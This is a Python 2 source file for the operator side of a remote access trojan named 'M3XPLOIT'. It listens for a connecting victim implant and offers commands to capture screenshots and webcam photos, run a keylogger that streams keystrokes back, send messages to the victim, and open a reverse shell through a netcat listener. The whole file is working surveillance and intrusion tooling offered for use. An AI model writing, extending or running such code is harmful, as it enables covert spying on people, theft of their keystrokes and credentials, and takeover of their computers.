import socket, sys, threading, os
from datetime import datetime

def user():
    os.system('whoami > /tmp/user')
    file = open('/tmp/user').read()
    if "root" not in file:
        print "Run as root"
        exit(0)
user()

def main(main_sock):
    global sock
    sock = main_sock
    
    print "M3XPLOIT, Type [?] or [help] to see more options\n"
    try:
        while True:
            pack = str(raw_input("M3XPLOIT > "))

            if pack == "?" or pack == "help":
                print 'screenshot\t\tTake a screenshot\nwebcam_shot\t\tTake a webcam shot\nsend_msg\t\tSend msg for the victm\nkeylogger\t\tInit a keylogger\nshell\t\t\tGet a reverse shell\nexit,quit\t\tExit from M3XPLOIT\n'

            elif pack == "quit" or pack == 'exit':
                exit(0)

            elif pack == 'webcam_shot':
                sock.send('webcam')
                webcam()
                
            elif pack == 'screenshot':
                sock.send('screenshot')
                screenshot()
                
            elif pack == "keylogger":
                sock.send("keylogger")
                keylogger()

            elif pack == 'shell':
                sock.send('shell')
                sock.send(str(port2))
                os.system('nc -lvp '+str(port2))

            elif pack == "send_msg":
                sock.send('imahacker')
                sendmsg()
            else:
                print "Unkown command ["+str(pack)+"]"
    except Exception as erro:
        print "Keyboard interruption", erro
        sock.close()
        exit(0)



def sendmsg():
    print "Write your menssage | Send with [ENTER] | MAX DATA 4024 BITES"
    data = raw_input('MSG: ')
    file = open('/tmp/.mensage', 'w')
    file.write(data)
    file.close

    sock.send(data)
def webcam():
    id = str(datetime.now()).replace(' ', '').split(".")[0]+".jpg"
    print "Taking a picture...."
    file = open("Webcam"+id, 'w')
    end = False
    erro = True
    while end == False:
        image = sock.recv(999999999)

        file.write(image)

        if 'ENDFILE' in image:
            end = True
            erro = False
            pass
                
        elif "ERROR" in image:
            print sock.recv(1024)
            file.close()
            end = True
            erro = True
            pass
                    
        if erro == False:
            file.close()
            print "Saved in: Webcam"+id+'\n\n'

def screenshot():
    id = str(datetime.now()).replace(' ', '').split(".")[0]+".jpg"
    print "Taking a screenshot...."
    file = open("Screenshot"+id, 'w')
    end = False
    erro = True
    while end == False:
        image = sock.recv(999999999)
        if 'ENDFILE' in image:
            end = True
            erro = False
            pass
                
        elif "ERROR" in image:
            print sock.recv(1024)
            file.close()
            end = True
            erro = True
            pass
        
        file.write(image)
        
        if erro == False:
            file.close()
            print "Saved in: Screenshot"+id+'\n\n'

def keylogger():
    id = str(datetime.now()).replace(' ', '').split(".")[0]+".txt"
    file = open("logs-"+id, 'w')

    try:
        while True:
            key = sock.recv(10)
            file.write(key)
            print key
    except:
        print "Saved as",id
        file.close()


def connect(porta, ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((ip, int(porta)))
    print "Listening on",str(ip)+":"+str(porta)
    sock.listen(1)

    global send_msg
    send_msg, address = sock.accept()
    print "Connected with", address[0]
    main(send_msg)
def init():
    try:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        global port2
        port2 = int(sys.argv[3])
    except:
        print "Use:",sys.argv[0],'BIND IP', "<PORT1> <PORT2>\nExemple: python",sys.argv[0],"0.0.0.0","443 8080\n\n"
        exit(0)
        
    connect(port, ip)

init()
